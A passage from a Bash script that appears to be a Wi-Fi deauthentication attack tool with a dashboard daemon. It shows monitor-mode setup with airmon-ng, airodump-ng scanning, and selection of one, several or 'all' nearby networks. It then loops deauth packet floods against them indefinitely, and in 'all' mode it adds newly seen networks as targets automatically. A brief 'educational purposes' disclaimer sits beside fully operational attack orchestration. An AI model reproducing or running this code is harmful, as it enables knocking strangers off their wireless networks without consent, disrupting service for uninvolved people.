            daemon_log "Scan live: +${added} new, -${removed} gone, ${NET_COUNT} visible [${SIGNAL_SENSITIVITY}]"
        fi
        return 0
    fi

    for bssid in "${!OLD_ORDER[@]}"; do
        [[ -n "${CUR_SEEN[$bssid]:-}" ]] && order+=("$bssid")
    done
    for bssid in "${!CUR_SEEN[@]}"; do
        [[ -n "${OLD_ORDER[$bssid]:-}" ]] && continue
        order+=("$bssid")
        added=$((added + 1))
    done

    for bssid in "${order[@]}"; do
        new_bssid+=("$bssid")
        new_ch+=("${CUR_CH[$bssid]}")
        new_enc+=("${CUR_ENC[$bssid]}")
        new_essid+=("${CUR_ESSID[$bssid]}")
        new_pwr+=("${CUR_PWR[$bssid]}")
        new_pkt+=("${OLD_PKT[$bssid]:-$default_pkts}")
    done

    for bssid in "${!OLD_ORDER[@]}"; do
        [[ -n "${CUR_SEEN[$bssid]:-}" ]] && continue
        if (( now - ${NET_LAST_SEEN[$bssid]:-$now} <= stale )); then
            new_bssid+=("$bssid")
            new_ch+=("${NET_CHANNEL[${OLD_ORDER[$bssid]}]}")
            new_enc+=("${NET_ENC[${OLD_ORDER[$bssid]}]}")
            new_essid+=("${NET_ESSID[${OLD_ORDER[$bssid]}]}")
            new_pwr+=("${NET_POWER[${OLD_ORDER[$bssid]}]}")
            new_pkt+=("${OLD_PKT[$bssid]:-$default_pkts}")
            NET_ONLINE[$bssid]=0
        else
            removed=$((removed + 1))
            unset "NET_LAST_SEEN[$bssid]" "NET_ONLINE[$bssid]"
        fi
    done

    NET_COUNT=${#new_bssid[@]}
    NET_BSSID=()
    NET_CHANNEL=()
    NET_ENC=()
    NET_ESSID=()
    NET_POWER=()
    NET_PACKETS=()
    for i in $(seq 1 "$NET_COUNT"); do
        j=$((i - 1))
        NET_BSSID[$i]="${new_bssid[$j]}"
        NET_CHANNEL[$i]="${new_ch[$j]}"
        NET_ENC[$i]="${new_enc[$j]}"
        NET_ESSID[$i]="${new_essid[$j]}"
        NET_POWER[$i]="${new_pwr[$j]}"
        NET_PACKETS[$i]="${new_pkt[$j]}"
        bssid="${NET_BSSID[$i]}"
        [[ -n "${NET_ONLINE[$bssid]:-}" ]] || NET_ONLINE[$bssid]=0
    done

    if (( added > 0 || removed > 0 || NET_COUNT != prev_count )); then
        DAEMON_NET_REV=$((DAEMON_NET_REV + 1))
        daemon_log "Live update: +${added} new, -${removed} gone, ${NET_COUNT} total"
    fi
    return 0
}

daemon_live_watch_start() {
    local outprefix="${DAEMON_STATE_DIR}/session/scan"

    daemon_sync_mon_iface
    [[ -n "${MON_IFACE:-}" ]] || return 1

    if [[ -n "${SCAN_PID:-}" ]] && kill -0 "$SCAN_PID" 2>/dev/null; then
        DAEMON_LIVE_ACTIVE=1
        return 0
    fi

    mkdir -p "${DAEMON_STATE_DIR}/session"
    if start_airodump_scan "$MON_IFACE" "$outprefix"; then
        DAEMON_LIVE_ACTIVE=1
        daemon_log "Live watch started on $MON_IFACE"
        return 0
    fi
    return 1
}

daemon_quick_live_probe() {
    local dur="${1:-2}"
    local outprefix probe_csv

    (( ATTACK_DWELL_TICKS >= 8 )) || return 0
    [[ -n "${MON_IFACE:-}" ]] || return 1

    outprefix="${DAEMON_STATE_DIR}/session/live_probe"
    rm -f "${outprefix}"*.csv 2>/dev/null || true
    timeout "$dur" airodump-ng "$MON_IFACE" --ignore-negative-one \
        -w "$outprefix" --output-format csv --write-interval 1 &>/dev/null || true
    probe_csv=$(find_scan_csv "$outprefix")
    if [[ -n "$probe_csv" && -f "$probe_csv" ]]; then
        merge_networks_from_csv "$probe_csv"
        daemon_save_networks
        daemon_auto_include_all_targets
    fi
    rm -f "${outprefix}"*.csv 2>/dev/null || true
}

daemon_auto_include_all_targets() {
    local i
    [[ "${DAEMON_ATTACK_MODE:-}" == "all" ]] || return 0
    DAEMON_ATTACK_TARGETS=()
    for i in $(seq 1 "${NET_COUNT:-0}"); do
        DAEMON_ATTACK_TARGETS+=("$i")
    done
}

daemon_live_watch_tick() {
    local outprefix contacts_file partial_csv net_count contacts_path
    local added_msg=""

    (( DAEMON_LIVE_ACTIVE )) || return 0
    (( DAEMON_SCAN_REMAINING > 0 )) && return 0

    daemon_sync_mon_iface
    [[ -n "${MON_IFACE:-}" ]] || return 0

    outprefix="${DAEMON_STATE_DIR}/session/scan"
    contacts_file="${DAEMON_STATE_DIR}/session/radar_contacts.txt"
    contacts_path="${RADAR_DIR}/contacts"

    if [[ -z "${SCAN_PID:-}" ]] || ! kill -0 "$SCAN_PID" 2>/dev/null; then
        if (( DAEMON_ATTACK_ACTIVE )); then
            return 0
        fi
        daemon_live_watch_start || return 0
    fi

    DAEMON_LIVE_TICK=$((DAEMON_LIVE_TICK + 1))
    (( DAEMON_LIVE_TICK % 15 == 0 )) || return 0

    partial_csv=$(find_scan_csv "$outprefix")
    [[ -n "$partial_csv" && -f "$partial_csv" ]] || return 0

    SCAN_CSV="$partial_csv"
    local prev_rev=$DAEMON_NET_REV
    merge_networks_from_csv "$partial_csv" || return 0
    daemon_save_networks

    if (( DAEMON_ATTACK_ACTIVE )) && [[ "${DAEMON_ATTACK_MODE:-}" == "all" ]]; then
        daemon_auto_include_all_targets
    fi

    export_contacts_from_csv "$partial_csv" "$contacts_file"
    net_count=$NET_COUNT
    DAEMON_CONTACTS=$net_count
    [[ -d "${RADAR_DIR:-}" ]] && cp "$contacts_file" "$contacts_path" 2>/dev/null || true

    if (( DAEMON_NET_REV != prev_rev )); then
        added_msg=" (live)"
    fi
    if (( DAEMON_ATTACK_ACTIVE )); then
        return 0
    fi

    radar_write_state "scan" 0 0 "$DAEMON_FRAME" "$contacts_file" \
        "LIVE SONAR — ${NET_COUNT} AP(s)" "$net_count" || true
    daemon_write_status "ready" "Live scan — ${NET_COUNT} network(s)${added_msg}"
}

# ------------------------------------------------------------
# 6. Select target(s)
# ------------------------------------------------------------
select_targets() {
    local choice
    while true; do
        safe_read choice "Enter the number of the network to send deauth, or type 'all' to attack all networks: "
        if [[ $choice =~ ^[0-9]+$ ]]; then
            if (( choice >= 1 && choice <= NET_COUNT )); then
                TARGET_MODE="single"
                TARGET_INDEX=$choice
                break
            else
                echo "Number out of range (1-$NET_COUNT)."
            fi
        elif [[ ${choice,,} == "all" ]]; then
            TARGET_MODE="all"
            break
        else
            echo "Invalid input. Enter a number or 'all'."
        fi
    done
}

# ------------------------------------------------------------
# 7. Disclaimer and agreement
# ------------------------------------------------------------
show_disclaimer() {
    echo "============================================"
    echo "DISCLAIMER:"
    echo "This tool is for educational purposes only."
    echo "Only Syed Hassan Bacha is authorized to use this tool."
    echo "Unauthorised use is illegal and strictly prohibited."
    echo "============================================"
    local answer
    safe_read answer "Do you agree to use this tool only for legal educational testing? (yes/no): "
    if [[ ${answer,,} != "yes" ]]; then
        die "You must agree to the terms to continue. Adapter will be restored before exit."
    fi
}

# ------------------------------------------------------------
# 8. Deauth attack
# ------------------------------------------------------------
cleanup() {
    local rc="${1:-$?}"
    if [[ "${CLEANUP_RAN:-0}" -eq 1 ]]; then
        exit "$rc"
    fi
    CLEANUP_RAN=1
    trap - EXIT INT TERM ERR

    echo ""
    info "Cleaning up and restoring system state..."

    restore_managed_mode
    set +e
    radar_shutdown
    if [[ "${NM_WAS_ACTIVE:-0}" -eq 1 || "${WPA_WAS_ACTIVE:-0}" -eq 1 ]]; then
        restore_network_services
    fi
    set -e

    if [[ -n "${TEMPDIR:-}" && -d "${TEMPDIR:-}" ]]; then
        rm -rf "$TEMPDIR" 2>/dev/null || warn "Could not remove temporary files in $TEMPDIR"
        TEMPDIR=""
    fi

    if (( rc == 0 )); then
        echo "Done. All settings restored."
    else
        warn "Script exited with errors (code $rc). Adapter and services were still restored."
    fi

    exit "$rc"
}

attack_single() {
    local bssid="$1"
    local channel="$2"
    local frame=0
    local packet_phase=0
    local contacts_file="${TEMPDIR}/radar_attack_contacts.txt"
    local essid="${NET_ESSID[$TARGET_INDEX]}"

    apply_attack_speed

    if ! start_deauth_on_target "$bssid" "$channel"; then
        die "Failed to start deauth on $bssid channel $channel."
    fi

    trap 'cleanup 130' INT TERM
    info "Packet strike active — watch sonar radar in separate window."
    info "Target: $essid ($bssid) channel $channel | speed: $ATTACK_SPEED"

    export_contacts_from_arrays "$contacts_file" "$TARGET_INDEX"
    set +e
    while true; do
        if ! deauth_any_alive; then
            start_deauth_on_target "$bssid" "$channel" || break
        fi
        packet_phase=$(( (packet_phase + ATTACK_PACKET_RATE) % 100 ))
        export_contacts_from_arrays "$contacts_file" "$TARGET_INDEX"
        radar_write_state "attack" 0 0 "$frame" "$contacts_file" \
            "TX >>> $essid" "$NET_COUNT" "$TARGET_INDEX" "$essid" "$packet_phase"
        frame=$((frame + 1))
        if (( frame % 25 == 0 )); then
            info "LIVE TX >>> $essid — packets firing toward target..."
        fi
        sleep 0.08
    done
    set -e
    stop_deauth_attack
}

attack_all() {
    local dwell="${ATTACK_DWELL:-10}"
    local i bssid channel essid round=1

    echo ""
    echo "Loop attack on $NET_COUNT network(s) — sonar radar in separate window."
    echo "Packet mode: MAXIMUM | ${dwell}s per network | Press Ctrl+C to stop."
    trap 'cleanup 130' INT TERM

    set +e
    while true; do
        for i in $(seq 1 "$NET_COUNT"); do
            bssid="${NET_BSSID[$i]}"
            channel="${NET_CHANNEL[$i]}"
            essid="${NET_ESSID[$i]}"

            is_valid_mac "$bssid" || continue
            is_valid_channel "$channel" || continue

            apply_attack_speed
            dwell="${ATTACK_DWELL:-10}"

            if ! start_deauth_on_target "$bssid" "$channel"; then
                warn "Could not attack $essid on channel $channel"
                continue
            fi

            play_beep
            run_radar_attack_animation "$i" "$essid"
            stop_deauth_attack
        done
        round=$((round + 1))
        info "Round $round — restarting..."
    done
    set -e
}

# ------------------------------------------------------------
# 9. Dashboard daemon API
# ------------------------------------------------------------
daemon_log() {
    echo "[$(date '+%H:%M:%S')] $*" >>"${DAEMON_STATE_DIR}/daemon.log"
    trim_daemon_log
}

daemon_write_status() {
    local phase="${1:-$DAEMON_PHASE}"
    local msg="${2:-}"
    local err="${3:-}"
    local tx_ok="${DAEMON_TX_OK:-0}"
    local tx_msg="${DAEMON_TX_MSG:-}"

    if [[ "$phase" == "attacking" ]]; then
        STATUS_WRITE_SKIP=$((STATUS_WRITE_SKIP + 1))
        if (( DAEMON_TX_OK != 0 )) && (( STATUS_WRITE_SKIP % 5 != 0 )); then
            return 0
        fi
    else
        STATUS_WRITE_SKIP=0
    fi

    DAEMON_PHASE="$phase"
    msg="${msg//\"/\\\"}"
    err="${err//\"/\\\"}"
    tx_msg="${tx_msg//\"/\\\"}"

    safe_write "${DAEMON_STATE_DIR}/status.json" \
        "{\"phase\":\"$phase\",\"message\":\"$msg\",\"mon_iface\":\"${MON_IFACE:-}\",\"selected_iface\":\"${SELECTED_IFACE:-}\",\"scan_remaining\":${DAEMON_SCAN_REMAINING:-0},\"scan_total\":${DAEMON_SCAN_TOTAL:-0},\"contacts\":${DAEMON_CONTACTS:-0},\"attack_target\":\"${DAEMON_ATTACK_TARGET:-}\",\"attack_active\":${DAEMON_ATTACK_ACTIVE:-0},\"attack_speed\":\"${ATTACK_SPEED:-high}\",\"attack_dwell\":${ATTACK_DWELL:-5},\"shift_dwell\":${SHIFT_DWELL_SEC:-0},\"shift_packets\":${SHIFT_PACKETS:-0},\"packet_rate\":${ATTACK_PACKET_RATE:-18},\"tx_ok\":${tx_ok},\"tx_message\":\"${tx_msg}\",\"error\":\"$err\",\"live_watch\":${DAEMON_LIVE_ACTIVE:-0},\"net_rev\":${DAEMON_NET_REV:-0},\"net_count\":${NET_COUNT:-0},\"sensitivity\":\"${SIGNAL_SENSITIVITY:-high}\"}" \
        || warn "Could not write status (disk full?)"
}

daemon_write_result() {
    local target="${DAEMON_STATE_DIR}/result"

    if [[ -n "${DAEMON_REQ_ID:-}" ]]; then
        target="${DAEMON_STATE_DIR}/cmd_queue/${DAEMON_REQ_ID}.result"
    fi
    safe_write "$target" "$1"$'\n' || warn "Could not write command result (disk full?)"
}

daemon_save_networks() {
    local f="${DAEMON_STATE_DIR}/networks.tsv"
    local i pkts bssid online

    : >"$f"
    for i in $(seq 1 "${NET_COUNT:-0}"); do
        pkts="${NET_PACKETS[$i]:-$(default_packets_for_network)}"
        bssid="${NET_BSSID[$i]}"
        online="${NET_ONLINE[$bssid]:-1}"
        printf '%d\t%s\t%s\t%s\t%s\t%s\t%d\t%s\n' "$i" \
            "$bssid" "${NET_CHANNEL[$i]}" "${NET_ENC[$i]}" \
            "${NET_POWER[$i]}" "${NET_ESSID[$i]}" "$pkts" \
            "$([[ "$online" == 1 ]] && echo online || echo offline)" >>"$f"
    done
}

daemon_cmd_set_network_packets() {
    local args="$1"
    local pair idx val

    for pair in $args; do
        [[ "$pair" == *=* ]] || continue
        idx="${pair%%=*}"
        val="${pair#*=}"
        idx="${idx//[[:space:]]/}"
        val="${val//[[:space:]]/}"
        [[ "$idx" =~ ^[0-9]+$ ]] || continue
        [[ "$val" =~ ^[0-9]+$ ]] || continue
        if (( idx >= 1 && idx <= NET_COUNT )); then
            NET_PACKETS[$idx]=$val
        fi
    done
    daemon_save_networks
    daemon_write_result "OK"
}

daemon_list_ifaces_json() {
    local -a ifaces=()
    local iface labels="" i label

    while read -r iface; do
        iface_exists "$iface" && ifaces+=("$iface")
    done < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')

    for i in "${!ifaces[@]}"; do
        label=$(get_adapter_label "${ifaces[$i]}")
        label="${label//\"/\\\"}"
        labels+="{\"iface\":\"${ifaces[$i]}\",\"label\":\"$label\"}"
        (( i < ${#ifaces[@]} - 1 )) && labels+=","
    done

    safe_write "${DAEMON_STATE_DIR}/ifaces.json" "{\"ifaces\":[$labels]}"
    daemon_write_result "OK"
    daemon_log "LIST_IFACES: ${#ifaces[@]} adapter(s)"
}

daemon_cleanup_cmd_queue() {
    local dir="${1:-${DAEMON_STATE_DIR:-}}"
    [[ -n "$dir" && -d "${dir}/cmd_queue" ]] || return 0
    find "${dir}/cmd_queue" -maxdepth 1 -name '*.cmd' -delete 2>/dev/null || true
    find "${dir}/cmd_queue" -maxdepth 1 -name '*.result' -delete 2>/dev/null || true
    rm -f "${dir}/result" 2>/dev/null || true
}

api_enable_monitor() {
    local iface="$1"
    local base_iface output rc mon err_detail

    SELECTED_IFACE="$iface"
    daemon_log "Preparing adapter $iface..."

    if is_monitor_iface "$iface"; then
        ip link set "$iface" up &>/dev/null || true
        MON_IFACE="$iface"
        MONITOR_ENABLED=1
        if [[ "${WIFI_DASHBOARD_MODE:-0}" -eq 1 && -n "${DAEMON_STATE_DIR:-}" ]]; then
            safe_write "${DAEMON_STATE_DIR}/mon_iface" "$MON_IFACE"
        fi
        daemon_log "Already in monitor mode: $MON_IFACE"
        return 0
    fi

    base_iface=$(get_base_iface "$iface")
    if iface_exists "${base_iface}mon" && is_monitor_iface "${base_iface}mon"; then
        ip link set "${base_iface}mon" up &>/dev/null || true
        MON_IFACE="${base_iface}mon"
        MONITOR_ENABLED=1
        if [[ "${WIFI_DASHBOARD_MODE:-0}" -eq 1 && -n "${DAEMON_STATE_DIR:-}" ]]; then
            safe_write "${DAEMON_STATE_DIR}/mon_iface" "$MON_IFACE"
        fi
        daemon_log "Using existing monitor iface: $MON_IFACE"
        return 0
    fi

    iface="$base_iface"
    save_network_state
    daemon_log "Stopping conflicting services for $iface..."
    airmon-ng check kill &>/dev/null || true
    ip link set "$iface" down &>/dev/null || true
    ip link set "$iface" up &>/dev/null || true

    if lsusb -d 148f:2070 &>/dev/null || lsusb -d 148f:3070 &>/dev/null; then
        modprobe rt2800usb &>/dev/null || true
        sleep 0.5
    fi

    set +e
    output=$(airmon-ng start "$iface" 2>&1)
    rc=$?
    mon=$(detect_mon_iface "$output" "$iface")
    set -e

    if (( rc != 0 )) || [[ -z "$mon" ]]; then
        daemon_log "airmon-ng failed on $iface: $output"
        mon=$(try_iw_monitor_mode "$iface" || true)
        if [[ -z "$mon" ]]; then
            err_detail=$(echo "$output" | tr '\n' ' ' | head -c 200)
            daemon_log "iw monitor fallback also failed on $iface"
            safe_write "${DAEMON_STATE_DIR}/last_error" "airmon-ng failed on $iface. ${err_detail} Try another adapter (e.g. wlan1)."
            return 1
        fi
        daemon_log "Monitor enabled via iw on $mon"
    fi

    ip link set "$mon" up &>/dev/null || true
    sleep 0.8
    if ! is_monitor_iface "$mon"; then
        airmon-ng stop "$mon" &>/dev/null || true
        iw dev "$mon" set type managed &>/dev/null || true
        safe_write "${DAEMON_STATE_DIR}/last_error" "Monitor verification failed on $mon — adapter may not support monitor mode."
        daemon_log "Monitor verification failed for $mon"
        return 1
    fi

    MON_IFACE="$mon"
    MONITOR_ENABLED=1
    if [[ "${WIFI_DASHBOARD_MODE:-0}" -eq 1 && -n "${DAEMON_STATE_DIR:-}" ]]; then
        safe_write "${DAEMON_STATE_DIR}/mon_iface" "$MON_IFACE"
    fi
    daemon_log "Monitor ready: $MON_IFACE ($(iw dev "$MON_IFACE" info 2>/dev/null | awk '/type/{print $2}'))"
    return 0
}

daemon_sync_mon_iface() {
    if [[ -n "${MON_IFACE:-}" ]]; then
        return 0
    fi
    if [[ -f "${DAEMON_STATE_DIR}/mon_iface" ]]; then
        MON_IFACE=$(<"${DAEMON_STATE_DIR}/mon_iface")
        [[ -n "$MON_IFACE" ]] && MONITOR_ENABLED=1
    fi
}

daemon_enable_monitor_async() {
    local iface="$1"
    local err_msg="Monitor mode failed on $iface"

    set +e
    if api_enable_monitor "$iface"; then
        safe_write "${DAEMON_STATE_DIR}/mon_iface" "$MON_IFACE"
        daemon_write_status "ready" "Monitor interface ready: $MON_IFACE"
    else
        safe_write "${DAEMON_STATE_DIR}/mon_iface" ""
        if [[ -f "${DAEMON_STATE_DIR}/last_error" ]]; then
            err_msg=$(<"${DAEMON_STATE_DIR}/last_error")
        fi
        daemon_write_status "error" "$err_msg" "monitor_failed"
        daemon_log "ENABLE_MONITOR failed: $err_msg"
    fi
    MONITOR_JOB_BUSY=0
}

daemon_cmd_enable_monitor() {
    local iface="$1"

    if (( MONITOR_JOB_BUSY )) && kill -0 "$MONITOR_JOB_PID" 2>/dev/null; then
        daemon_write_result "BUSY"
        return
    fi

    MONITOR_JOB_BUSY=1
    daemon_write_status "busy" "Enabling monitor on $iface..."
    daemon_write_result "OK"

    daemon_enable_monitor_async "$iface" &
    MONITOR_JOB_PID=$!
    disown "$MONITOR_JOB_PID" 2>/dev/null || true
}

daemon_cmd_scan_start() {
    local dur="$1"
    local outprefix contacts_file

    daemon_sync_mon_iface

    if [[ -z "${MON_IFACE:-}" ]]; then
        daemon_write_status "error" "Enable monitor mode first" "no_monitor"
        daemon_write_result "ERROR"
        daemon_log "SCAN_START rejected: MON_IFACE not set"
        return
    fi

    stop_deauth_attack
    DAEMON_ATTACK_ACTIVE=0

    TEMPDIR="${DAEMON_STATE_DIR}/session"
    mkdir -p "$TEMPDIR"
    outprefix="${TEMPDIR}/scan"
    WIFI_DASHBOARD_MODE=1
    radar_init_state

    iw reg set BO &>/dev/null || true
    ip link set "$MON_IFACE" up &>/dev/null || true

    if ! start_airodump_scan "$MON_IFACE" "$outprefix"; then
        daemon_write_status "error" "Scan failed — airodump could not start on $MON_IFACE" "scan_failed"
        daemon_write_result "ERROR"
        return
    fi

    DAEMON_SCAN_REMAINING=$dur
    DAEMON_SCAN_TOTAL=$dur
    DAEMON_SCAN_TICK=0
    DAEMON_CONTACTS=0
    DAEMON_FRAME=0
    DAEMON_SCAN_HEAVY_SKIP=0
    DAEMON_LIVE_ACTIVE=0
    NET_COUNT=0
    NET_BSSID=()
    NET_CHANNEL=()
    NET_ENC=()
    NET_ESSID=()
    NET_POWER=()
    NET_PACKETS=()
    NET_LAST_SEEN=()
    NET_ONLINE=()
    : >"${DAEMON_STATE_DIR}/networks.tsv"
    DAEMON_NET_REV=$((DAEMON_NET_REV + 1))
    contacts_file="${TEMPDIR}/radar_contacts.txt"
    : >"$contacts_file"

    daemon_write_status "scanning" "Sonar scan started (${dur}s)"
    daemon_write_result "OK"
    daemon_log "Scan started on $MON_IFACE for ${dur}s"
}

daemon_finalize_scan() {
    local outprefix contacts_file partial_csv

    outprefix="${DAEMON_STATE_DIR}/session/scan"
    contacts_file="${DAEMON_STATE_DIR}/session/radar_contacts.txt"

    partial_csv=$(find_scan_csv "$outprefix")
    if [[ -z "$partial_csv" || ! -f "$partial_csv" ]]; then
        kill -SIGINT "$SCAN_PID" 2>/dev/null || true
        wait "$SCAN_PID" 2>/dev/null || true
        SCAN_PID=""
        daemon_write_status "error" "No scan output file found" "no_csv"
        return 1
    fi

    SCAN_CSV="$partial_csv"
    set +e
    parse_networks "$SCAN_CSV" &>/dev/null
    set -e
    cleanup_scan_artifacts "${DAEMON_STATE_DIR}/session/scan" "$partial_csv"
    daemon_save_networks
    DAEMON_LIVE_ACTIVE=1
    daemon_live_watch_start || true
    export_contacts_from_csv "$partial_csv" "$contacts_file"
    radar_write_state "scan" 0 "$DAEMON_SCAN_TOTAL" "$DAEMON_FRAME" \
        "$contacts_file" "LIVE SONAR ACTIVE" "$NET_COUNT"
    daemon_write_status "ready" "Scan complete — ${NET_COUNT:-0} network(s) | live watch ON"
    daemon_log "Scan complete: ${NET_COUNT:-0} networks — live watch enabled"
}

daemon_scan_tick() {
    local outprefix contacts_file partial_csv net_count contacts_path prev_rev

    (( DAEMON_SCAN_REMAINING > 0 )) || return 0

    outprefix="${DAEMON_STATE_DIR}/session/scan"
    contacts_file="${DAEMON_STATE_DIR}/session/radar_contacts.txt"
    contacts_path="${RADAR_DIR}/contacts"

    ensure_airodump_running "$MON_IFACE" "$outprefix" || true

    DAEMON_SCAN_HEAVY_SKIP=$((DAEMON_SCAN_HEAVY_SKIP + 1))
    if (( DAEMON_SCAN_HEAVY_SKIP >= 2 )); then
        DAEMON_SCAN_HEAVY_SKIP=0
        partial_csv=$(find_scan_csv "$outprefix")
        if [[ -n "$partial_csv" && -f "$partial_csv" ]]; then
            prev_rev=$DAEMON_NET_REV
            export_contacts_from_csv "$partial_csv" "$contacts_file"
            merge_networks_from_csv "$partial_csv" strict 2>/dev/null || true
            daemon_save_networks
            net_count=$NET_COUNT
            DAEMON_CONTACTS=$net_count
            cp "$contacts_file" "$contacts_path" 2>/dev/null || true
            if (( DAEMON_NET_REV != prev_rev )); then
                daemon_write_status "scanning" \
                    "Live scan — ${DAEMON_SCAN_REMAINING}s left, ${net_count} network(s)"
            fi
        else
            net_count=${DAEMON_CONTACTS:-0}
        fi
    else
        net_count=${DAEMON_CONTACTS:-0}
    fi

    radar_write_state "scan" "$DAEMON_SCAN_REMAINING" "$DAEMON_SCAN_TOTAL" \
        "$DAEMON_FRAME" "$contacts_file" "LIVE SCAN..." "$net_count" || true

    DAEMON_FRAME=$((DAEMON_FRAME + 1))
    DAEMON_SCAN_TICK=$((DAEMON_SCAN_TICK + 1))

    if (( DAEMON_FRAME % 40 == 0 )); then
        partial_csv=$(find_scan_csv "$outprefix")
        cleanup_scan_artifacts "$outprefix" "$partial_csv"
    fi

    if (( DAEMON_SCAN_TICK >= 10 )); then
        DAEMON_SCAN_TICK=0
        DAEMON_SCAN_REMAINING=$((DAEMON_SCAN_REMAINING - 1))
        daemon_write_status "scanning" \
            "Live scan — ${DAEMON_SCAN_REMAINING}s left, ${net_count} network(s)"
    fi

    if (( DAEMON_SCAN_REMAINING <= 0 )); then
        daemon_finalize_scan || true
    fi
}

daemon_cmd_scan_stop() {
    if (( DAEMON_SCAN_REMAINING > 0 )); then
        DAEMON_SCAN_REMAINING=0
        daemon_finalize_scan
    fi
    daemon_write_result "OK"
}

parse_attack_indices() {
    local raw="$1"
    local -a parsed=()
    local t i

    DAEMON_ATTACK_TARGETS=()
    IFS=',' read -ra parsed <<< "$raw"
    for t in "${parsed[@]}"; do
        t="${t//[[:space:]]/}"
        [[ "$t" =~ ^[0-9]+$ ]] || continue
        if (( t >= 1 && t <= NET_COUNT )); then
            DAEMON_ATTACK_TARGETS+=("$t")
        fi
    done

    if (( ${#DAEMON_ATTACK_TARGETS[@]} == 0 )); then
        return 1
    fi

    local -A seen=()
    local -a unique=()
    for t in "${DAEMON_ATTACK_TARGETS[@]}"; do
        [[ -n "${seen[$t]:-}" ]] && continue
        seen[$t]=1
        unique+=("$t")
    done
    DAEMON_ATTACK_TARGETS=("${unique[@]}")
    return 0
}

daemon_cmd_attack_start() {
    local mode="$1"
    local idx="${2:-1}"
    local bssid channel essid contacts_file target_key i target_pkts

    daemon_sync_mon_iface

    if [[ -z "${MON_IFACE:-}" ]]; then
        daemon_write_status "error" "Monitor not ready" "no_monitor"
        daemon_write_result "ERROR"
        return
    fi

    if (( NET_COUNT <= 0 )); then
        daemon_write_status "error" "No networks — run scan first" "no_networks"
        daemon_write_result "ERROR"
        return
    fi

    apply_attack_speed
    apply_shift_dwell "$mode"
    stop_deauth_attack
    stop_airodump_scan
    DAEMON_LIVE_ACTIVE=0
    DAEMON_ATTACK_ACTIVE=1
    DAEMON_ATTACK_MODE="$mode"
    DAEMON_LIVE_ATTACK=0
    [[ "$mode" == "all" ]] && DAEMON_LIVE_ATTACK=1
    DAEMON_FRAME=0
    DAEMON_PACKET_PHASE=0
    contacts_file="${DAEMON_STATE_DIR}/session/radar_attack_contacts.txt"

    if [[ "$mode" == "all" ]]; then
        DAEMON_ATTACK_TARGETS=()
        for i in $(seq 1 "$NET_COUNT"); do
            DAEMON_ATTACK_TARGETS+=("$i")
        done
        DAEMON_ATTACK_IDX=1
        DAEMON_ATTACK_REMAINING=$ATTACK_DWELL_TICKS
        TARGET_MODE="all"
        target_key="${DAEMON_ATTACK_IDX}"
    elif [[ "$mode" == "multi" || "$mode" == "selected" ]]; then
        if ! parse_attack_indices "$idx"; then
            daemon_write_status "error" "No valid target indices: $idx" "bad_targets"
            daemon_write_result "ERROR"
            DAEMON_ATTACK_ACTIVE=0
            return
        fi
        DAEMON_ATTACK_IDX="${DAEMON_ATTACK_TARGETS[0]}"
        DAEMON_ATTACK_REMAINING=$ATTACK_DWELL_TICKS
        TARGET_MODE="multi"
        target_key=$(IFS=,; echo "${DAEMON_ATTACK_TARGETS[*]}")
    else
        if ! parse_attack_indices "$idx"; then
            daemon_write_status "error" "Invalid target index: $idx" "bad_target"
            daemon_write_result "ERROR"
            DAEMON_ATTACK_ACTIVE=0
            return
        fi
        DAEMON_ATTACK_IDX="${DAEMON_ATTACK_TARGETS[0]}"
        DAEMON_ATTACK_REMAINING=0
        TARGET_MODE="single"
        TARGET_INDEX="${DAEMON_ATTACK_TARGETS[0]}"
        target_key="${TARGET_INDEX}"
    fi

    bssid="${NET_BSSID[$DAEMON_ATTACK_IDX]}"
    channel="${NET_CHANNEL[$DAEMON_ATTACK_IDX]}"
    essid="${NET_ESSID[$DAEMON_ATTACK_IDX]}"
    DAEMON_ATTACK_TARGET="$essid"
    target_pkts=$(effective_attack_packets "$DAEMON_ATTACK_IDX" "$mode")

    if ! start_deauth_on_target "$bssid" "$channel" "$target_pkts"; then
        DAEMON_TX_OK=0
        DAEMON_TX_MSG="Failed to start packet TX on $essid (iface busy or injection failed)"
        write_tx_status "$DAEMON_ATTACK_IDX" "$essid" 0 "$DAEMON_TX_MSG"
        daemon_write_status "error" "Failed to start attack on $essid" "deauth_failed"
        daemon_log "ATTACK_START failed: $essid ($bssid) ch$channel on $MON_IFACE"
        daemon_write_result "ERROR"
        DAEMON_ATTACK_ACTIVE=0
        return
    fi

    export_contacts_from_arrays "$contacts_file" "$target_key"
    radar_write_state "attack" "$DAEMON_ATTACK_REMAINING" "$ATTACK_DWELL_TICKS" 0 \
        "$contacts_file" "TX >>> $essid" "$NET_COUNT" "$DAEMON_ATTACK_IDX" \
        "$essid" "$DAEMON_PACKET_PHASE"

    daemon_write_status "attacking" "Packet strike >>> $essid [${ATTACK_SPEED}]"
    daemon_write_result "OK"
    play_attack_burst

    verify_packet_tx "$target_pkts" && DAEMON_TX_OK=1 || DAEMON_TX_OK=0
    if (( DAEMON_TX_OK )); then
        DAEMON_TX_MSG="TX OK — deauth frames firing on $essid (${DEAUTH_CLIENT_COUNT} clients, ${DEAUTH_PPS} pps, ${DEAUTH_MODE})"
    else
        DAEMON_TX_MSG="TX FAIL — deauth NOT sending on $essid! Try wlan1 (Ralink) adapter."
    fi
    write_tx_status "$DAEMON_ATTACK_IDX" "$essid" "$DAEMON_TX_OK" "$DAEMON_TX_MSG"
}

daemon_next_attack_target() {
    local pos=-1 i

    for i in "${!DAEMON_ATTACK_TARGETS[@]}"; do
        if (( DAEMON_ATTACK_TARGETS[i] == DAEMON_ATTACK_IDX )); then
            pos=$i
            break
        fi
    done

    if (( pos < 0 )); then
        DAEMON_ATTACK_IDX="${DAEMON_ATTACK_TARGETS[0]}"
        return 0
    fi

    pos=$((pos + 1))
    if (( pos >= ${#DAEMON_ATTACK_TARGETS[@]} )); then
        pos=0
    fi
    DAEMON_ATTACK_IDX="${DAEMON_ATTACK_TARGETS[pos]}"
}

daemon_switch_attack_target() {
    local bssid channel essid target_pkts

    stop_deauth_attack
    if (( DAEMON_LIVE_ATTACK )); then
        daemon_quick_live_probe 2
    fi
    daemon_auto_include_all_targets
    daemon_next_attack_target
    apply_attack_speed
    apply_shift_dwell "${DAEMON_ATTACK_MODE:-all}"
    bssid="${NET_BSSID[$DAEMON_ATTACK_IDX]}"
    channel="${NET_CHANNEL[$DAEMON_ATTACK_IDX]}"
    essid="${NET_ESSID[$DAEMON_ATTACK_IDX]}"
    target_pkts=$(effective_attack_packets "$DAEMON_ATTACK_IDX" "${DAEMON_ATTACK_MODE:-all}")
    DAEMON_ATTACK_TARGET="$essid"
